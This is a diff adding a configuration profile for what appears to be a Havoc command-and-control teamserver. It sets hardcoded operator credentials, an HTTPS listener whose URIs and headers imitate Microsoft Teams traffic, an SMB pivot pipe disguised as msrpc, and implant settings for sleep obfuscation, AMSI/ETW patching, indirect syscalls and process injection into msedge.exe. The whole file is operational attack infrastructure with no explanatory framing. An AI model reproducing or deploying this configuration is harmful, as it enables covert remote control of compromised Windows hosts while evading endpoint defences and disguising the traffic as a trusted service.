@@ -1,0 +1,89 @@
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+
+    Build {
+        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
+        Nasm = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "kraken" {
+        Password = "kraken123"
+    }
+}
+
+Listeners {
+    Http {
+        Name         = "teams profile - http"
+        HostBind     = "0.0.0.0"
+        HostRotation = "round-robin"
+
+        PortBind = 443
+        PortConn = 443
+
+        Hosts = [
+            "10.10.10.165",
+        ]
+
+        Secure = true
+
+        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
+
+        Uris = [
+            "/Collector/2.0/settings/",
+            "/Collector/2.0/settings",
+            "/Collector/2.0/",
+            "/Collector/2.0/settings/?tenantId=common&client=desktop",
+            "/Collector/2.0/settings/?os=windows&version=27/1.0.0.2023041501",
+            "/Collector/2.0/settings/?"
+        ]
+
+        Headers = [
+            "Accept: json",
+            "Referer: https://teams.microsoft.com/_",
+            "x-ms-client-type: desktop",
+            "x-mx-client-version: 27/1.0.0.2023041501",
+            "Accept-Encoding: gzip, deflate, br",
+            "Origin: https://teams.microsoft.com"
+        ]
+
+        Response {
+            Headers = [
+                "Content-Type: application/json; charset=utf-8",
+                "Server: Microsoft-HTTPAPI/2.0",
+                "X-Content-Type-Options: nosniff",
+                "x-ms-environment: North Europe-prod-3,_cnsVMSS-6_26",
+                "x-ms-latency: 40018.2038",
+                "Access-Control-Allow-Origin: https://teams.microsoft.com",
+                "Access-Control-Allow-Credentials: true",
+                "Connection: keep-alive"
+            ]
+        }
+    }
+
+    Smb {
+        Name     = "Pivot - Smb"
+        PipeName = "msrpc_00a4c3f8"
+    }
+}
+
+Demon {
+    Sleep = 2
+    Jitter = 15
+
+    TrustXForwardedFor = false
+    
+    SleepTechnique = "Ekko"
+    ProxyLoading = "RtlCreateTimer"
+    AmsiEtwPatching = "Hardware breakpoints"
+    IndirectSyscall = true
+    StackDuplication = true
+
+    Injection {
+        Spawn64 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
+    }
+}
